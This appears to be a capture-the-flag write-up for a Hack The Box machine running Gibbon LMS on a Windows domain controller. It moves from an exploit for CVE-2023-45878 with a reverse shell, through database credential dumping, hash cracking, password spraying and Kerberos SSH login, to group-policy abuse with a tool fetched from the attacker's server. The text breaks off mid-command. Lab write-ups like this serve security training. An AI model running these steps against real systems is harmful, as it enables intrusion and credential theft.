output: <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 13:20 EDT\nNmap scan report for frizz.htb (10.10.11.60)\nHost is up (0.16s latency).\nrDNS record for 10.10.11.60: frizzdc.frizz.htb\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh?\n53/tcp   open  domain        (generic dns response: SERVFAIL)\n80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-19 00:20:39Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port53-TCP:V=7.95%I=7%D=5/18%Time=682A16F3%P=x86_64-pc-linux-gnu%r(DNS-\nSF:SD-TCP,30,\"\\0\\.\\0\\0\\x80\\x82\\0\\x01\\0\\0\\0\\0\\0\\0\\t_services\\x07_dns-sd\\x04\nSF:_udp\\x05local\\0\\0\\x0c\\0\\x01\");\nService Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 211.91 seconds\n</code></pre></p> <p>we can see from our nmap scan, this line: <pre><code>rDNS record for 10.10.11.60: frizzdc.frizz.htb\n</code></pre> so lets add frizzdc.frizz.htb on etc/hosts too and continue <pre><code>echo '10.10.11.60 frizzdc.frizz.htb' | sudo tee -a /etc/hosts\n</code></pre> our /etc/hosts file now looks like this <pre><code>10.10.11.60 frizzdc.frizz.htb frizz.htb\n</code></pre></p> <p>First things first, lets to navigate to the web app, we stumble accross this page which appears to be the home page:  by scrolling downwards, we can see nothing valuable, so lets try searching the rest of the pages</p> <p>The \"pricing\" page similary contains nothing important</p> <p>Then by inspecting the staff login (blue button on top right) we come accross this page right here:</p> <p>whats interesting here, is that it is indeed a login page, but it actually shows the version of the service!  Powered by Gibbon v25.0.00</p> <p>So it appears to be a Gibbon Service (which is an open source school management platform). This specific version of it (v25.0.0.), appears to be vulnerable to multiple CVEs , but specifically  <code>CVE-2023-45878</code> stands out as it allows RCE .</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#foothold","title":"Foothold","text":"<p>So if found this exploit:  https://github.com/0xyy66/CVE-2023-45878_to_RCE/blob/main/CVE-2023-45878.sh</p> <p>lets run it: <pre><code>./CVE-2023-45878.sh 10.10.14.158 9999 10.10.11.60:80\n</code></pre></p> <p>and we successfully got rev shell as <code>w.webservice</code> <pre><code>\u2514\u2500# nc -lvnp 9999                      \nlistening on [any] 9999 ...\nconnect to [10.10.14.158] from (UNKNOWN) [10.10.11.60] 63899\nMicrosoft Windows [Version 10.0.20348.3207]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\xampp\\htdocs\\Gibbon-LMS&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is D129-C3DA\n\n Directory of C:\\xampp\\htdocs\\Gibbon-LMS\n\n05/18/2025  05:54 PM    &lt;DIR&gt;          .\n10/29/2024  07:28 AM    &lt;DIR&gt;          ..\n01/20/2023  07:04 AM               634 .htaccess\n05/18/2025  05:54 PM             7,168 7zip.exe\n01/20/2023  07:04 AM           197,078 CHANGEDB.php\n01/20/2023  07:04 AM           103,023 CHANGELOG.txt\n01/20/2023  07:04 AM             2,972 composer.json\n01/20/2023  07:04 AM           294,353 composer.lock\n10/11/2024  08:15 PM             1,307 config.php\n01/20/2023  07:04 AM             3,733 error.php\n01/20/2023  07:04 AM             1,608 export.php\n01/20/2023  07:04 AM            32,988 favicon.ico\n01/20/2023  07:04 AM             2,277 fullscreen.php\n01/20/2023  07:04 AM            57,535 functions.php\n01/20/2023  07:04 AM             5,610 gibbon.php\n10/29/2024  07:27 AM           493,211 gibbon.sql\n01/20/2023  07:04 AM         1,254,473 gibbon_demo.sql\n05/18/2025  05:54 PM                33 gibbon_myconfig.php\n01/20/2023  07:04 AM    &lt;DIR&gt;          i18n\n01/20/2023  07:04 AM            31,228 index.php\n01/20/2023  07:04 AM             2,356 indexExport.php\n01/20/2023  07:04 AM               813 indexFindRedirect.php\n01/20/2023  07:04 AM            12,327 index_fastFinder_ajax.php\n01/20/2023  07:04 AM             2,579 index_notification_ajax.php\n01/20/2023  07:04 AM             2,767 index_notification_ajax_alarm.php\n01/20/2023  07:04 AM             1,690 index_notification_ajax_alarmConfirmProcess.php\n01/20/2023  07:04 AM             1,647 index_notification_ajax_alarmProcess.php\n01/20/2023  07:04 AM             1,245 index_notification_ajax_alarm_tickUpdate.php\n01/20/2023  07:04 AM             2,142 index_parentPhotoDeleteProcess.php\n01/20/2023  07:04 AM             3,549 index_parentPhotoUploadProcess.php\n01/20/2023  07:04 AM             2,046 index_tt_ajax.php\n01/20/2023  07:04 AM    &lt;DIR&gt;          installer\n01/20/2023  07:04 AM               753 keepAlive.php\n01/20/2023  07:04 AM    &lt;DIR&gt;          lib\n01/20/2023  07:04 AM            35,113 LICENSE\n01/20/2023  07:04 AM             7,589 login.php\n01/20/2023  07:04 AM             1,263 logout.php\n01/20/2023  07:04 AM    &lt;DIR&gt;          modules\n01/20/2023  07:04 AM             3,905 notifications.php\n01/20/2023  07:04 AM             2,110 notificationsActionProcess.php\n01/20/2023  07:04 AM             1,163 notificationsDeleteAllProcess.php\n01/20/2023  07:04 AM             2,275 notificationsDeleteProcess.php\n01/20/2023  07:04 AM             5,007 passwordReset.php\n01/20/2023  07:04 AM             9,819 passwordResetProcess.php\n01/20/2023  07:04 AM             9,146 preferences.php\n01/20/2023  07:04 AM             5,165 preferencesPasswordProcess.php\n01/20/2023  07:04 AM             4,367 preferencesProcess.php\n01/20/2023  07:04 AM               923 privacyPolicy.php\n01/20/2023  07:04 AM             7,184 publicRegistration.php\n01/20/2023  07:04 AM             1,355 publicRegistrationCheck.php\n01/20/2023  07:04 AM             7,825 publicRegistrationProcess.php\n01/20/2023  07:04 AM             2,884 README.md\n01/20/2023  07:04 AM             3,521 report.php\n01/20/2023  07:04 AM    &lt;DIR&gt;          resources\n01/20/2023  07:04 AM                54 robots.txt\n01/20/2023  07:04 AM             1,883 roleSwitcherProcess.php\n01/20/2023  07:04 AM    &lt;DIR&gt;          src\n01/20/2023  07:04 AM    &lt;DIR&gt;          themes\n01/20/2023  07:04 AM             2,641 update.php\n10/29/2024  07:28 AM    &lt;DIR&gt;          uploads\n01/20/2023  07:04 AM    &lt;DIR&gt;          vendor\n01/20/2023  07:04 AM             1,288 version.php\n01/20/2023  07:04 AM             4,359 yearSwitcherProcess.php\n              52 File(s)      2,643,984 bytes\n              11 Dir(s)   2,041,827,328 bytes free\n\nC:\\xampp\\htdocs\\Gibbon-LMS&gt;\n</code></pre></p> <p>So after a brief inspection to most of the files, i found that config.php contains credentials! <pre><code>C:\\xampp\\htdocs\\Gibbon-LMS&gt;type config.php\ntype config.php\n&lt;?php\n/*\nGibbon, Flexible &amp; Open School System\nCopyright (C) 2010, Ross Parker\n\nThis program is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.\n*/\n\n/**\n * Sets the database connection information.\n * You can supply an optional $databasePort if your server requires one.\n */\n$databaseServer = 'localhost';\n$databaseUsername = 'MrGibbonsDB';\n$databasePassword = 'MisterGibbs!Parrot!?1';\n$databaseName = 'gibbon';\n\n/**\n * Sets a globally unique id, to allow multiple installs on a single server.\n */\n$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';\n\n/**\n * Sets system-wide caching factor, used to balance performance and freshness.\n * Value represents number of page loads between cache refresh.\n * Must be positive integer. 1 means no caching.\n */\n$caching = 10;\n</code></pre></p> <p>great! now we have those creds, but what to do with them? <pre><code>$databaseServer = 'localhost';\n$databaseUsername = 'MrGibbonsDB';\n$databasePassword = 'MisterGibbs!Parrot!?1';\n$databaseName = 'gibbon';\n</code></pre> according to the variables assigned to them, it appears to refer to some database.</p> <p>But first, we must find a way  to locate the database</p> <p>By navigating through the directories, we see that there is a directory called mysql, which obviously is used for the database, lets continue. <pre><code>C:\\xampp&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is D129-C3DA\n\n Directory of C:\\xampp\n\n10/29/2024  07:28 AM    &lt;DIR&gt;          .\n10/29/2024  07:25 AM    &lt;DIR&gt;          apache\n10/29/2024  07:26 AM    &lt;DIR&gt;          cgi-bin\n10/29/2024  07:25 AM    &lt;DIR&gt;          contrib\n10/29/2024  07:28 AM    &lt;DIR&gt;          htdocs\n10/29/2024  07:25 AM    &lt;DIR&gt;          licenses\n10/29/2024  07:25 AM    &lt;DIR&gt;          mysql\n10/29/2024  07:26 AM    &lt;DIR&gt;          php\n10/29/2024  07:25 AM    &lt;DIR&gt;          src\n05/18/2025  05:50 PM    &lt;DIR&gt;          tmp\n               0 File(s)              0 bytes\n              10 Dir(s)   2,095,861,760 bytes free\n\nC:\\xampp&gt;\n</code></pre></p> <p>getting in the mysql dir, we see this <pre><code>C:\\xampp\\mysql&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is D129-C3DA\n\n Directory of C:\\xampp\\mysql\n\n10/29/2024  07:25 AM    &lt;DIR&gt;          .\n10/29/2024  07:28 AM    &lt;DIR&gt;          ..\n10/29/2024  07:25 AM    &lt;DIR&gt;          backup\n10/29/2024  07:26 AM    &lt;DIR&gt;          bin\n10/30/2023  05:36 AM            17,987 COPYING\n10/30/2023  05:36 AM             2,104 CREDITS\n05/18/2025  05:50 PM    &lt;DIR&gt;          data\n10/29/2024  07:27 AM               843 mysql_installservice.bat\n03/30/2013  05:29 AM               395 mysql_uninstallservice.bat\n10/30/2023  05:36 AM             2,874 README.md\n06/03/2019  04:39 AM             1,095 resetroot.bat\n10/29/2024  07:25 AM    &lt;DIR&gt;          scripts\n10/29/2024  07:25 AM    &lt;DIR&gt;          share\n10/30/2023  05:36 AM            86,263 THIRDPARTY\n               7 File(s)        111,561 bytes\n               7 Dir(s)   2,095,861,760 bytes free\n\nC:\\xampp\\mysql&gt;\n</code></pre></p> <p>we should be able to find somehwere the executable of mysql, in order to login.</p> <p>I found this to be located inside the bin directory: </p> <p>Now that we have the executable, we are ready to connect to the database:</p> <p>Lets run the command below, to connect and show all available databases: <pre><code>.\\mysql.exe -u MrGibbonsDB -p\"MisterGibbs!Parrot!?1\" -e \"show databases;\"\n</code></pre> the command returns this output, there are 4 databases <pre><code>Database\ngibbon\ninformation_schema\ntest\n</code></pre></p> <p>From those 4 databases, we know that we only have access to gibbon, because the creds we found appear to be related to this database ($databasename). <pre><code>$databaseServer = 'localhost';\n$databaseUsername = 'MrGibbonsDB';\n$databasePassword = 'MisterGibbs!Parrot!?1';\n$databaseName = 'gibbon';\n</code></pre></p> <p>Lets view the tables of database gibbon: <pre><code>.\\mysql.exe -u MrGibbonsDB -p\"MisterGibbs!Parrot!?1\" -e \"SHOW TABLES;\" gibbon\n</code></pre> output: <pre><code>gibbonaction\ngibbonactivity\ngibbonactivityattendance\ngibbonactivityslot\ngibbonactivitystaff\ngibbonactivitystudent\ngibbonactivitytype\ngibbonadmissionsaccount\ngibbonadmissionsapplication\ngibbonalarm\ngibbonalarmconfirm\ngibbonalertlevel\ngibbonapplicationform\ngibbonapplicationformfile\ngibbonapplicationformlink\ngibbonapplicationformrelationship\ngibbonattendancecode\ngibbonattendancelogcourseclass\ngibbonattendancelogformgroup\ngibbonattendancelogperson\ngibbonbehaviour\ngibbonbehaviourletter\ngibboncountry\ngibboncourse\ngibboncourseclass\ngibboncourseclassmap\ngibboncourseclassperson\ngibboncrowdassessdiscuss\ngibboncustomfield\ngibbondataretention\ngibbondaysofweek\ngibbondepartment\ngibbondepartmentresource\ngibbondepartmentstaff\ngibbondiscussion\ngibbondistrict\ngibbonemailtemplate\ngibbonexternalassessment\ngibbonexternalassessmentfield\ngibbonexternalassessmentstudent\ngibbonexternalassessmentstudententry\ngibbonfamily\ngibbonfamilyadult\ngibbonfamilychild\ngibbonfamilyrelationship\ngibbonfamilyupdate\ngibbonfileextension\ngibbonfinancebillingschedule\ngibbonfinancebudget\ngibbonfinancebudgetcycle\ngibbonfinancebudgetcycleallocation\ngibbonfinancebudgetperson\ngibbonfinanceexpense\ngibbonfinanceexpenseapprover\ngibbonfinanceexpenselog\ngibbonfinancefee\ngibbonfinancefeecategory\ngibbonfinanceinvoice\ngibbonfinanceinvoicee\ngibbonfinanceinvoiceeupdate\ngibbonfinanceinvoicefee\ngibbonfirstaid\ngibbonfirstaidfollowup\ngibbonform\ngibbonformfield\ngibbonformgroup\ngibbonformpage\ngibbonformsubmission\ngibbonformupload\ngibbongroup\ngibbongroupperson\ngibbonhook\ngibbonhouse\ngibboni18n\ngibbonin\ngibboninarchive\ngibboninassistant\ngibbonindescriptor\ngibbonininvestigation\ngibbonininvestigationcontribution\ngibboninpersondescriptor\ngibboninternalassessmentcolumn\ngibboninternalassessmententry\ngibbonlanguage\ngibbonlibraryitem\ngibbonlibraryitemevent\ngibbonlibrarytype\ngibbonlog\ngibbonmarkbookcolumn\ngibbonmarkbookentry\ngibbonmarkbooktarget\ngibbonmarkbookweight\ngibbonmedicalcondition\ngibbonmessenger\ngibbonmessengercannedresponse\ngibbonmessengerreceipt\ngibbonmessengertarget\ngibbonmigration\ngibbonmodule\ngibbonnotification\ngibbonnotificationevent\ngibbonnotificationlistener\ngibbonoutcome\ngibbonpayment\ngibbonpermission\ngibbonperson\ngibbonpersonaldocument\ngibbonpersonaldocumenttype\ngibbonpersonmedical\ngibbonpersonmedicalcondition\ngibbonpersonmedicalconditionupdate\ngibbonpersonmedicalupdate\ngibbonpersonreset\ngibbonpersonstatuslog\ngibbonpersonupdate\ngibbonplannerentry\ngibbonplannerentrydiscuss\ngibbonplannerentryguest\ngibbonplannerentryhomework\ngibbonplannerentryoutcome\ngibbonplannerentrystudenthomework\ngibbonplannerentrystudenttracker\ngibbonplannerparentweeklyemailsummary\ngibbonreport\ngibbonreportarchive\ngibbonreportarchiveentry\ngibbonreportingaccess\ngibbonreportingcriteria\ngibbonreportingcriteriatype\ngibbonreportingcycle\ngibbonreportingprogress\ngibbonreportingproof\ngibbonreportingscope\ngibbonreportingvalue\ngibbonreportprototypesection\ngibbonreporttemplate\ngibbonreporttemplatefont\ngibbonreporttemplatesection\ngibbonresource\ngibbonresourcetag\ngibbonrole\ngibbonrubric\ngibbonrubriccell\ngibbonrubriccolumn\ngibbonrubricentry\ngibbonrubricrow\ngibbonscale\ngibbonscalegrade\ngibbonschoolyear\ngibbonschoolyearspecialday\ngibbonschoolyearterm\ngibbonsession\ngibbonsetting\ngibbonspace\ngibbonspaceperson\ngibbonstaff\ngibbonstaffabsence\ngibbonstaffabsencedate\ngibbonstaffabsencetype\ngibbonstaffapplicationform\ngibbonstaffapplicationformfile\ngibbonstaffcontract\ngibbonstaffcoverage\ngibbonstaffcoveragedate\ngibbonstaffduty\ngibbonstaffdutyperson\ngibbonstaffjobopening\ngibbonstaffupdate\ngibbonstring\ngibbonstudentenrolment\ngibbonstudentnote\ngibbonstudentnotecategory\ngibbonsubstitute\ngibbontheme\ngibbontt\ngibbonttcolumn\ngibbonttcolumnrow\ngibbonttday\ngibbonttdaydate\ngibbonttdayrowclass\ngibbonttdayrowclassexception\ngibbonttimport\ngibbonttspacebooking\ngibbonttspacechange\ngibbonunit\ngibbonunitblock\ngibbonunitclass\ngibbonunitclassblock\ngibbonunitoutcome\ngibbonusernameformat\ngibbonyeargroup\n</code></pre></p> <p>There are too much tables, so i tried viewing the contents of the names of the ones if found more \"interesting\", like gibbonperson, which would be more likely to contain more personal information. <pre><code>.\\mysql.exe -u MrGibbonsDB -p\"MisterGibbs!Parrot!?1\" -e \"USE gibbon; SELECT * FROM gibbonperson;\" -E\n</code></pre></p> <p>and it seems it contains some more creds! <pre><code>C:\\xampp\\mysql\\bin&gt;.\\mysql.exe -u MrGibbonsDB -p\"MisterGibbs!Parrot!?1\" -e \"SHOW TABLES;\" Database\n.\\mysql.exe -u MrGibbonsDB -p\"MisterGibbs!Parrot!?1\" -e \"SHOW TABLES;\" Database\nERROR 1044 (42000): Access denied for user 'MrGibbonsDB'@'localhost' to database 'database'\n\nC:\\xampp\\mysql\\bin&gt;.\\mysql.exe -u MrGibbonsDB -p\"MisterGibbs!Parrot!?1\" -e \"USE gibbon; SELECT * FROM gibbonperson;\" -E\n.\\mysql.exe -u MrGibbonsDB -p\"MisterGibbs!Parrot!?1\" -e \"USE gibbon; SELECT * FROM gibbonperson;\" -E\n*************************** 1. row ***************************\n           gibbonPersonID: 0000000001\n                    title: Ms.\n                  surname: Frizzle\n                firstName: Fiona\n            preferredName: Fiona\n             officialName: Fiona Frizzle\n         nameInCharacters: \n                   gender: Unspecified\n                 username: f.frizzle\n           passwordStrong: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03\n       passwordStrongSalt: /aACFhikmNopqrRTVz2489\n       passwordForceReset: N\n                   status: Full\n                 canLogin: Y\n      gibbonRoleIDPrimary: 001\n          gibbonRoleIDAll: 001\n                      dob: NULL\n                    email: f.frizzle@frizz.htb\n           emailAlternate: NULL\n                image_240: NULL\n            lastIPAddress: ::1\n            lastTimestamp: 2024-10-29 09:28:59\n        lastFailIPAddress: NULL\n</code></pre> here the valuable info is, that we found another user f.frizzle, and a hash associated with that user: <pre><code>username: f.frizzle\npasswordStrong: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03\npasswordStrongSalt: /aACFhikmNopqrRTVz2489\n</code></pre></p> <p>The password appears to be a hash, and by using hash-identifier tool it appears to be SHA-256 </p> <p>in our case, we have <pre><code>sha256($s.$p)  \u2190 SHA-256 of salt + password\n</code></pre> i tried dynamic_61 but failed, and dynamic_82 worked so i used that</p> <p>first lets create our file in this format: <pre><code>f.frizzle:$dynamic_82$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489\n</code></pre> then use john the ripper to crack this: <pre><code>john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt\n</code></pre> be carefull to the hash format! (--format=dynamic='sha256($s.$p)')</p> <p>after cracking, i found this password  so our updated creds are <pre><code>f.frizzle\nJenni_Luvs_Magic23\n</code></pre></p> <p>now we are one step closer to logging in , lets try logging in with win-rm <pre><code>evil-winrm -i frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23'\n</code></pre></p> <p>BUT WAIT, it seems we cant login via winrm, and seems logical since win-rm port (5985) isnt open! what should we do now? here comes the trickiest part...</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#logging-in-as-ffrizzle","title":"Logging in as f.frizzle","text":"<p>we can login to f.frizzle through ssh via GSSAPI authentication if we get f.frizzle's ticket</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#what-is-gssapi-authentication","title":"What is GSSAPI authentication?","text":"<p>GSSAPI authentication lets you log in without entering a password \u2014 securely and automatically \u2014 if your system and the server both trust the same Kerberos domain. It\u2019s basically how Single Sign-On (SSO) works in Linux/Unix and some Windows-integrated environments.</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#how-it-works","title":"How It Works","text":"<ol> <li>\u2705 You log in to your local machine and get a Kerberos ticket (TGT).</li> <li>\ud83d\udce1 You connect via <code>ssh</code> to a remote server using <code>GSSAPIAuthentication</code>.</li> <li>\ud83d\udd11 Instead of asking for a password, the SSH client sends your Kerberos ticket to the server.</li> <li>\ud83d\udee1\ufe0f If the server trusts the same Kerberos domain, it accepts the ticket and logs you in \u2014 no password needed.</li> </ol> <p>But first, we need to modify\u00a0<code>/etc/krb5.conf</code>\u00a0(Kerberos\u00a0configuration file)  Now the Kerberos\u00a0client can use this configuration\u00a0to communicate with the\u00a0Kerberos authentication server.</p> <p>update local machine's krb5.conf file as shown: <pre><code>[domain_realm]\n    .frizz.htb = FRIZZ.HTB\n    frizz.htb = FRIZZ.HTB\n\n[libdefaults]\n    default_realm = FRIZZ.HTB\n    dns_lookup_realm = false\n    dns_lookup_kdc = true\n    ticket_lifetime = 24h\n    forwardable = true\n\n[realms]\n    FRIZZ.HTB = {\n        kdc = FRIZZDC.FRIZZ.HTB\n        admin_server = FRIZZDC.FRIZZ.HTB\n        default_domain = FRIZZ.HTB\n    }\n</code></pre></p> <p>First adjust/sync your time to the domain <pre><code>ntpdate frizzdc.frizz.htb\n</code></pre> then obtain f.frizzle's ticket using kinit (we could use impacket-getTGT, nothing changes, there are just multiple ways to do it) <pre><code>kinit f.frizzle@FRIZZ.HTB\n</code></pre> (it will ask for the password and then if nothing is shown it means it run successfully) then login via ssh and use <code>-K</code> for the GSSAPI authentication <pre><code>ssh f.frizzle@frizz.htb -K\n</code></pre></p> <p>we are in  and grabbed the user flag! <pre><code>b9f41dc9053d1ba4cc6604fc762a9cb7\n</code></pre></p>"},{"location":"ch3ckm8_HTB_TheFrizz/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_TheFrizz/#ad-enumeration","title":"AD enumeration","text":"<pre><code>bloodhound-python -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb -dc frizzdc.frizz.htb -ns 10.10.11.60  -c all  --zip\n</code></pre> <p>then upload the zip on bloodhound and inspect, start with our current user (f.frizzle) </p> <p>It seems that f.frizzle does not have any special permissions, lets now view other users in the domain.  There are too much users here.. from the gui we see that 2 users have a \"diamond\" sign. The diamond sign indicates that these users are part of the tier 0, which is the highest possible tier on an AD environment.</p> <p>The first one is administrators, which we dont have access (obviously).</p> <p>The second one is v.frizzle, but we have no permissions towards this user, also verified by v.frizzle's inbound object control graph. As we can see only administrator has permission over this user. </p> <p>Also if we inspect Administrator's inbound object control graph we cant see any other users other than v.frizzle to have permission over Administrator: </p> <p>After inspecting all of them, i concluded that M.SCHOOLBUS was the most interesting one: </p> <p>After inspection via bloodhound's graph it appears that a user called M.SCHOOLBUS is member of - DOMAIN USERS (non valuable info) - DESKTOP ADMINS -&gt; GROUP POLICY CREATOR OWNERS (valuable info) - REMOTE MANAGEMENT USERS (non valuable info)</p> <p>Both administrator and M.SCHOOLBUS (as a member of desktop admins group) have access to GROUP POLICY CREATOR OWNERS group. SO we found a user, that has the same permissions with Administrator over a high privilege group, thus skipping the requirement to become Administrator to use it. </p> <p>Okay, but HOW to go from f.frizzle (our current user) towards M.SCHOOLBUS ?? since f.frizzle has NO CONTROL over M.SCHOOLBUS? somehow we have to gain access to this user.</p> <p>Here comes the part that took me forever to find, since user's permissions did not help, we could check the recycle bin for anything usefull, unfortunately navigating to the recycle bin directly is not possible via <code>cd</code>, instead we can use powershell to list its contents, by running the commands below one by one on the C:\\Users\\f.frizzle directory, according to this post: https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/ <pre><code>PS C:\\Users\\f.frizzle&gt; $shell = New-Object -com shell.application \nPS C:\\Users\\f.frizzle&gt; $rb = $shell.namespace(10) \nPS C:\\Users\\f.frizzle&gt; $rb.Items()\n</code></pre> output: <pre><code>Application  : System.__ComObject\nParent       : System.__ComObject\nName         : wapt-backup-sunday.7z\nPath         : C:\\$RECYCLE.BIN\\S-1-5-21-2386970044-1145388522-2932701813-1103\\$RE2XMEG.7z\nGetLink      :\nGetFolder    :\nIsLink       : False\nIsFolder     : False\nIsFileSystem : True\nIsBrowsable  : False\nModifyDate   : 10/24/2024 9:16:29 PM\nSize         : 30416987\nType         : 7Z File\n</code></pre></p> <p>As we can see, there is an item <code>wapt-backup-sunday.7z</code> , but somehow we have to transfer it to our machine, so lets copy this file to the f.frizzle's home dir: <pre><code>PS C:\\Users\\f.frizzle&gt; $path = $item | Select-Object -ExpandProperty Path\nPS C:\\Users\\f.frizzle&gt; Copy-Item -Path $path -Destination wapt-backup-sunday.7z\n</code></pre></p> <p>then in order to transfer it locally to our machine, we can use <code>scp</code> <pre><code>scp f.frizzle@frizz.htb:wapt-backup-sunday.7z .\n</code></pre></p> <p>Locally, by extracting the compressed file <code>wapt-backup-sunday.7z</code> i came accross multiple files. The file that contained sth related to credentials was <code>waptserver.ini</code> and it contained a base64 string <pre><code>wapt_password = IXN1QmNpz0BNZWhUZWQhUgo=\n</code></pre> decoding the base64 gives us this, which appears to be the pass we were looking for <pre><code>echo 'IXN1QmNpz0BNZWhUZWQhUgo=' | base64 -d\n\n!suBci@MehTed!R\n</code></pre></p> <p>okay, we found a password, but for what user?  we do not have that information, only one way to find out, and thats via password spraying</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#password-spraying","title":"Password spraying","text":"<p>First, lets gather all the users, in order to create our sprayable list, personally i prefer GetADUsers.py for this: https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py <pre><code>GetADUsers.py -k -no-pass frizz.htb/ -dc-host frizzdc.frizz.htb -all | awk '{print $1}' | tail -n +6 &gt; users.txt\n</code></pre> (this part <code>| awk '{print $1}' | tail -n +6</code> skips unnecessary output like headers or status messages from impacket)</p> <p>This will put the usernames on a txt file (but without the @domain, only usernames, because thats what kerbrute requires in the user list).</p> <p>Then spray the users we found for this password: <pre><code>kerbrute passwordspray --dc frizzdc.frizz.htb -d frizz.htb users.txt '!suBci@MehTed!R'\n</code></pre> it appears that this pass is associated with user M.SchoolBus <pre><code>[+] VALID LOGIN: M.SchoolBus@frizz.htb:!suBci@MehTed!R\n</code></pre></p> <p>so the creds for M.schoolbus user are: <pre><code>M.schoolbus\n!suBcig@MehTed!R\n</code></pre></p>"},{"location":"ch3ckm8_HTB_TheFrizz/#logging-in-as-mschoolbus","title":"Logging in as M.schoolbus","text":"<p>Great! we now have the creds for the M.schoolbus user, we will use the same steps we did for f.frizzle to login as M.schoolbus user, so generating ticket, and then login with ssh via GSSAPI authentication</p> <p>First adjust/sync your time to the domain <pre><code>ntpdate frizzdc.frizz.htb\n</code></pre> Generate ticket for M.schoolbus user (instead of kinit we did for f.frizzle, nothing changes, there are just multiple ways to do it) <pre><code>impacket-getTGT frizz.htb/'M.schoolbus':'!suBcig@MehTed!R' -dc-ip frizzdc.frizz.htb\n</code></pre> Then login using the <code>-K</code> parameter, which enables GSSAPI authentication and forwarding of credentials. <pre><code>ssh M.schoolbus@frizz.htb -K\n</code></pre> and we are in!</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#enumeration","title":"Enumeration","text":"<p>okay, we got in as M.schoolbus, what now? we can start enumerating by inspecting the groups that this user belongs to: <pre><code>whoami /groups\n</code></pre> output: (removed attributes and part of sid column to fit vertically here) <pre><code>Group Name                                   Type             SID\n============================================ ================ ======================\nEveryone                                     Well-known group S-1-1-0\nBUILTIN\\Remote Management Users              Alias            S-1-5-32-580\nBUILTIN\\Users                                Alias            S-1-5-32-545\nBUILTIN\\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554\nNT AUTHORITY\\NETWORK                         Well-known group S-1-5-2\nNT AUTHORITY\\Authenticated Users             Well-known group S-1-5-11\nNT AUTHORITY\\This Organization               Well-known group S-1-5-15\nfrizz\\Desktop Admins                         Group            S-1-5-21-2386970044-\nfrizz\\Group Policy Creator Owners            Group            S-1-5-21-2386970044-\nAuthentication authority asserted identity   Well-known group S-1-18-1\nfrizz\\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-\nMandatory Label\\Medium Mandatory Level       Label            S-1-16-8192\n</code></pre> interesting, the user appears to belong to the\u00a0<code>Group Policy Creator Owners</code>\u00a0group. This group can create GPOs and modify them.</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#abusing-gpo","title":"Abusing GPO","text":"<p>First create a new Group Policy Object (GPO) named \"ch3ckm8\",  it does not link the GPO anywhere yet tho, this gpo it's just created inside the Group Policy store of the domain. <pre><code>New-GPO -Name \"ch3ckm8\"\n</code></pre></p> <p>Links the existing GPO named <code>\"ch3ckm8\"</code> to the Organizational Unit (OU) <code>Domain Controllers</code> in the domain <code>frizz.htb</code>. <pre><code>New-GPLink -Name \"ch3ckm8\" -Target \"OU=Domain Controllers,DC=frizz,DC=htb\"\n</code></pre> - <code>OU=Domain Controllers,DC=frizz,DC=htb</code> specifies the Distinguished Name (DN) of the OU containing the domain controllers. - This means the policy will apply to all domain controller machines in the <code>frizz.htb</code> domain.</p> <p>Transfer SharpGPOAbuse.exe on the machine on dir \"C:\\Users\\M.SchoolBus\" https://github.com/byronkg/SharpGPOAbuse/blob/main/SharpGPOAbuse-master/SharpGPOAbuse.exe <pre><code>python3 -m http.server 8080\n</code></pre> transfer the binary from our local machine to the target: <pre><code>Invoke-WebRequest -Uri http://10.10.14.248:8080/SharpGPOAbuse.exe -OutFile SharpGPOAbuse.exe\n</code></pre> run it <pre><code>.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName 